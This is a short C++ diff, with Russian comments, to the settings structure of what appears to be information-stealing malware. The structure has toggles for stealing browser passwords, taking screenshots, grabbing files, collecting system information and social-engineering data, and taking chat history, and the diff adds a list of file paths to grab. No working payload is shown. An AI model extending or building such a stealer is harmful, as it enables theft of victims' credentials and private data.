@@ -81,6 +81,7 @@ public:
         bool passwords = false;            // Включение кражи паролей браузеров
         bool screenshot = false;           // Включение создания скриншота
         bool fileGrabber = false;          // Включение граббера файлов
+        std::vector<std::string> files;    // Добавлено поле для хранения путей к файлам
         bool systemInfo = false;           // Включение сбора системной информации
         bool socialEngineering = false;    // Включение сбора данных для социальной инженерии
         bool chatHistory = false;          // Включение сбора истории чатов
